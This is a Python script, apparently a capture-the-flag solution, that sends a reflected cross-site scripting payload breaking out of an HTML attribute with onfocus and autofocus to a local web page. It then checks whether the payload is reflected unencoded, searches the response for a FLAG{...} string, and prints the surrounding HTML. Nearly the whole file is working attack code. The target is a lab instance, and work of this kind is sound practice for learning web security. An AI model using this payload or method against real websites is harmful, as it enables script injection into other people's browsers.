import requests
import re
import html

# Target URL with XSS payload
url = "http://127.0.0.1:32811/page?name=test%22%20onfocus=%22alert('XSS')%22%20autofocus=%22"

print(f"[*] Sending GET request to: {url}")
print(f"[*] Decoded payload: test\" onfocus=\"alert('XSS')\" autofocus=\"")

try:
    response = requests.get(url, timeout=10)
    
    # Get response details
    status_code = response.status_code
    content = response.text
    
    print(f"\n[+] Response Status Code: {status_code}")
    print(f"[+] Response Length: {len(content)} characters")
    print(f"[+] Content-Type: {response.headers.get('content-type', 'N/A')}")
    
    # Check if payload is reflected
    decoded_payload = 'test" onfocus="alert(\'XSS\')" autofocus="'
    
    if decoded_payload in content:
        print(f"\n[!] VULNERABILITY CONFIRMED: Payload reflected UNENCODED in response!")
        print(f"[!] The exact payload appears in the response without proper encoding.")
        encoded = False
    elif html.escape(decoded_payload) in content or re.search(r'&quot; onfocus=&quot;alert\(&#39;XSS&#39;\)&quot; autofocus=&quot;', content):
        print(f"\n[!] Payload reflected but appears to be HTML-encoded")
        print(f"[!] This suggests some filtering is in place")
        encoded = True
    else:
        print(f"\n[-] Payload not found in response")
        encoded = None
    
    # Check specifically for alert('XSS') - the key string we're testing
    if "alert('XSS')" in content:
        print(f"\n[!] CRITICAL: The string 'alert('XSS')' appears UNENCODED in response!")
        print(f"[!] This is strong evidence of successful XSS injection.")
        alert_unencoded = True
    elif "alert(&#39;XSS&#39;)" in content or re.search(r'alert\(&#39;XSS&#39;\)', content):
        print(f"\n[!] The string 'alert('XSS')' appears HTML-encoded in response")
        alert_unencoded = False
    else:
        alert_unencoded = False
        print(f"\n[-] The string 'alert('XSS')' not found in response")
    
    # Search for FLAG{ patterns
    flag_pattern = r'FLAG\{[^}]+\}'
    flags = re.findall(flag_pattern, content)
    
    if flags:
        print(f"\n[!] FLAG FOUND: {flags}")
    else:
        print(f"\n[-] No FLAG pattern found in response")
    
    # Extract HTML context around reflection point
    print(f"\n{'='*80}")
    print("HTML CONTEXT AROUND REFLECTION POINT")
    print(f"{'='*80}")
    
    if decoded_payload in content:
        lines = content.split('\n')
        for i, line in enumerate(lines):
            if decoded_payload in line:
                print(f"\n[!] Payload found on line {i+1}:")
                start_line = max(0, i-10)
                end_line = min(len(lines), i+11)
                print(f"\n[v] Context (lines {start_line+1} to {end_line}):")
                for j in range(start_line, end_line):
                    marker = " >>> " if j == i else "     "
                    print(f"{marker}[{j+1:3d}] {lines[j]}")
                break
        else:
            # Multi-line match
            print(f"\n[*] Checking for multi-line reflection...")
    elif encoded or alert_unencoded:
        # Find where the encoded version appears
        if html.escape(decoded_payload) in content:
            lines = content.split('\n')
            search_str = html.escape(decoded_payload)
        elif "alert('XSS')" in content:
            lines = content.split('\n')
            search_str = "alert('XSS')"
        else:
            search_str = None
            
        if search_str:
            for i, line in enumerate(lines):
                if search_str in line:
                    print(f"\n[!] Found on line {i+1}:")
                    start_line = max(0, i-10)
                    end_line = min(len(lines), i+11)
                    print(f"\n[v] Context (lines {start_line+1} to {end_line}):")
                    for j in range(start_line, end_line):
                        marker = " >>> " if j == i else "     "
                        print(f"{marker}[{j+1:3d}] {lines[j]}")
                    break
    else:
        print(f"\n[-] Could not locate reflection point in HTML")
    
    # Summary
    print(f"\n{'='*80}")
    print("SUMMARY")
    print(f"{'='*80}")
    print(f"Status Code: {status_code}")
    print(f"Payload reflected: {'Yes (unencoded)' if decoded_payload in content else 'Yes (encoded)' if encoded else 'No'}")
    print(f"alert('XSS') appears: {'Yes (unencoded)' if alert_unencoded else 'Yes (encoded)' if encoded else 'No'}")
    print(f"FLAG found: {flags if flags else 'No'}")
    
except requests.exceptions.RequestException as e:
    print(f"\n[-] Request failed: {e}")
    print(f"[-] Cannot reach target URL")
except Exception as e:
    print(f"\n[-] Unexpected error: {e}")
    import traceback
    traceback.print_exc()
